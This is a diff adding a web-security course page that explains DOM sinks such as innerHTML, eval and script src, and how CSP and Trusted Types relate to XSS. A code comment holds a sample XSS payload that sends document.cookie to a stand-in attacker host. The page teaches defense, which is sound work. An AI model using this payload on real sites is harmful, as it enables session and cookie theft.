@@ -1,0 +1,76 @@
+<title>Prereq: DOM Sinks</title>
+<link rel="stylesheet" href="../assets/course.css">
+<style>:root { --accent: #bc8cff; }</style>
+
+<h1><span class="module-kicker">Prerequisites</span>DOM Sinks</h1>
+
+<p>
+A <strong>sink</strong> is any browser API that takes a string (or a
+string-shaped value) and turns it into <em>live</em> markup or <em>running</em>
+code. Sinks are the reason XSS is possible at all — an attacker doesn't need
+to exploit a browser bug, they just need to get their string into a sink your
+page already calls.
+</p>
+
+<h2 id="what-is-a-sink">Why "sink" and not just "function"</h2>
+<p>
+Think of your page's data flow as plumbing. Untrusted input (a URL parameter,
+a form field, a value from an API) is water. Most of your code just passes
+that water through pipes — string concatenation, storing it in a variable,
+displaying it as escaped text. A <strong>sink</strong> is a drain: the point
+where the water leaves the pipe system and does something in the real world.
+If untrusted water reaches a sink unfiltered, whatever the sink does, it does
+with attacker-controlled content.
+</p>
+
+<h2 id="innerhtml-sink">The HTML sink: <code>innerHTML</code></h2>
+<pre><code>// If `comment` came from a URL param or user input, this is a sink:
+document.getElementById('output').innerHTML = comment;
+
+// An attacker-supplied comment like this now RUNS as script:
+// &lt;img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)"&gt;</code></pre>
+<p>
+<code>innerHTML</code> doesn't just display a string — it <em>parses</em> it
+as HTML and inserts real DOM nodes, including elements whose event-handler
+attributes execute JS. <code>outerHTML</code>, <code>insertAdjacentHTML</code>,
+and <code>document.write</code> are the same category of sink.
+</p>
+
+<h2 id="eval-sink">The code sink: <code>eval</code> and friends</h2>
+<pre><code>eval(userInput);                    // runs userInput as JS, full stop
+new Function(userInput)();          // same category
+setTimeout(userInput, 100);         // string form of setTimeout also evals
+element.setAttribute('onclick', userInput); // injects an executable attribute</code></pre>
+
+<h2 id="script-src-sink">The script-loading sink: <code>&lt;script src&gt;</code></h2>
+<pre><code>const s = document.createElement('script');
+s.src = userSuppliedUrl;   // if attacker controls this URL, they control what runs
+document.head.appendChild(s);</code></pre>
+
+<h2 id="document-write-sink"><code>document.write</code></h2>
+<p>
+Worth calling out on its own: <code>document.write(str)</code> parses
+<code>str</code> as HTML directly into the document's parse stream — same
+danger class as <code>innerHTML</code>, but even less controllable because it
+can only be called while the document is still parsing.
+</p>
+
+<div class="callout ok">
+  <span class="label">Where this is going</span>
+  CSP's <code>script-src</code> directive (Track 1) restricts <em>where</em>
+  code is allowed to come from — and, verified directly in
+  <a href="../track2-trusted-types/14_dom_xss_sink_baseline/tutorial.html">Track 2 Module 14</a>,
+  a strict <code>script-src</code> genuinely does block an <code>onerror</code>
+  handler even when it arrives via <code>innerHTML = attackerString</code>
+  at runtime, not just ones written directly in the original HTML — don't
+  assume otherwise. What CSP has <em>no</em> jurisdiction over at all is the
+  <code>innerHTML</code> assignment itself: a string containing zero
+  executable content (real HTML structure, a real link to an attacker's
+  page — no script, no handler) sails through completely unchecked, because
+  there's nothing in it for script-src to evaluate. Trusted Types
+  (Track 2) exists to close <em>that</em> gap — the sink accepting a raw
+  string at all, regardless of whether anything inside it would ever try to
+  execute.
+</div>
+
+<footer class="course-footer">Prerequisites Layer · <a href="index.html">Back to Prerequisites</a></footer>
